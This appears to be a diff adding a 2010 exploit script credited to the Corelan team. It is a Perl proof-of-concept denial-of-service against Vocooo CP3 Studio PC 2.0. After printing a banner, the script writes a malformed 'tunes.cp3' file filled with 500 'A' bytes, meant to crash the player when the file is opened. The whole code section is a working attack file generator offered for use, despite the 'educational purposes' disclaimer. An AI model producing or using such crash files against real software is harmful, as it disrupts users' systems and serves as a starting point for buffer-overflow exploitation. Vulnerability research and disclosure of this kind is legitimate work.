@@ -1,0 +1,44 @@
+# Exploit Title : CP3 Studio PC Ver. Dos
+# Date          : June 12, 2010
+# Author        : chap0 - [www.seek-truth.net] 
+# Link 		: http://www.vocooo.com
+# Version       : 2.0
+# Tested on     : Windows XP SP3 En 
+# Greetz to     : Corelan Security Team
+# The Crew	: http://www.corelan.be:8800/index.php/security/corelan-team-members/
+# Advisory	: http://www.corelan.be:8800/advisories.php?id=CORELAN-10-051
+#
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+# Corelan does not want anyone to use this script
+# for malicious and/or illegal purposes
+# Corelan cannot be held responsible for any illegal use.
+#
+# Note : you are not allowed to edit/modify this code.  
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+#
+# Code :
+#!/usr/bin/perl
+print "|------------------------------------------------------------------|\n";
+print "|                         __               __                      |\n";
+print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n";
+print "|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n";
+print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n";
+print "| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n";
+print "|                                                                  |\n";
+print "|                                       http://www.corelan.be:8800 |\n";
+print "|                                                                  |\n";
+print "|-------------------------------------------------[ EIP Hunters ]--|\n\n";
+print "[+] Vocoo CP3 Studio 2.0 Dos. . .\n\n";
+sleep(2);
+my $play = "tunes.cp3";
+
+my $buffer = "\x41" x 500;
+
+open(FILE,">$play");
+print FILE $buffer;
+close(FILE);
+
+print "[+] Music Provided by chap0 visit www.corelan.be:8800\n";
+
